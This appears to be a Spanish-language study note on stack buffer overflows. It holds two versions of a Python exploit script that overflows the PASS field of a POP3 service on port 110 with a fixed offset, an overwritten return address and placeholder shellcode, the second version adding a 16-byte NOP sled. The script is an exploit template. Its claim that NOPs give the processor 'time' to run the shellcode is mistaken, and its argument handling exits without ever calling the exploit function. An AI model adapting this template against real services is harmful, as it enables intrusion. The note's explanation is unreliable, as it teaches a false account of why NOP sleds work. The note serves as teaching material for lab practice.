---
Tema: "[[Buffer Overflow]]"
---
para este codigo

```python
from struct import pack    #<--- para el Little Endian
import socket
import sys
IP_ADDRESS = "192.168.1.5"  # < --  IP de la victima
PORT =  110               # < --  puerto del servicio
offset = 2606
before_eip = b"A" * 2606
#eip = b"B" * 4
eip=pack("<L", 0x5f4c4d13)
shellcode = (b"\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23"
b"\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23"
b"\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23"
b"\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23"
b"\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23"
b"\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23"
b"\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23") # <- ESP - stack pointer

payload = before_eip + eip + shellcode

def exploit():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    # nos conectamos a la victima
    s.connect((IP_ADDRESS, PORT))
    banner = s.recv(1024)
    print(f"[+] Banner: {banner}")
    s.send(b"USER test\r\n")
    response = s.recv(1024)
    print(f"[+] Response: {response}")
    s.send(b"PASS " + payload + b"\r\n")
    s.close()
if __name__ == '__main__':
    if len(sys.argv) == 3:
        IP_ADDRESS = sys.argv[1]
        PORT = int(sys.argv[2])
        print(f"\n[!] Uso: python {sys.argv[0]} <IP>")
        exit(1)
        
```

pero falta algo ya que esto asi no lo va a interpretar.

y esto es porque
- el shellcode es muy complejo y amplio, por lo que la ejecucion del mismo puede requerir mas **tiempo** de la que el procesador tiene disponible antes de que continue con la siguiente instruccion del programa

por lo que se le asigna un "espacio de descanso al procesador" de modo que con ese espacio el procesador cuente con el tiempo para que pueda ejecutar todas estas instruccion es.

A esto se lo conoce como `NOP`s (Not Operations Codes) baicamente son bytes que significa "NO HAGAS NADA" y se representan como 0x90

esto puedes hacer poniendo por ejemplo 16 de esos `NOPs`. 

```python
from struct import pack    #<--- para el Little Endian
import socket
import sys
IP_ADDRESS = "192.168.1.5"  # < --  IP de la victima
PORT =  110               # < --  puerto del servicio
offset = 2606
before_eip = b"A" * 2606
#eip = b"B" * 4
eip=pack("<L", 0x5f4c4d13)
shellcode = (b"\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23"
b"\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23"
b"\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23"
b"\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23"
b"\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23"
b"\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23"
b"\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23") # <- ESP - stack pointer

payload = before_eip + eip + b"\x90"*16 + shellcode

def exploit():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    # nos conectamos a la victima
    s.connect((IP_ADDRESS, PORT))
    banner = s.recv(1024)
    print(f"[+] Banner: {banner}")
    s.send(b"USER test\r\n")
    response = s.recv(1024)
    print(f"[+] Response: {response}")
    s.send(b"PASS " + payload + b"\r\n")
    s.close()
if __name__ == '__main__':
    if len(sys.argv) == 3:
        IP_ADDRESS = sys.argv[1]
        PORT = int(sys.argv[2])
        print(f"\n[!] Uso: python {sys.argv[0]} <IP>")
        exit(1)
        
```


otra forma de hacer lo mismo es hacer un **desplazamiento de pila** para que tarde un poco en llegar a la pila y pueda interpretar el shellcode de manera correcta


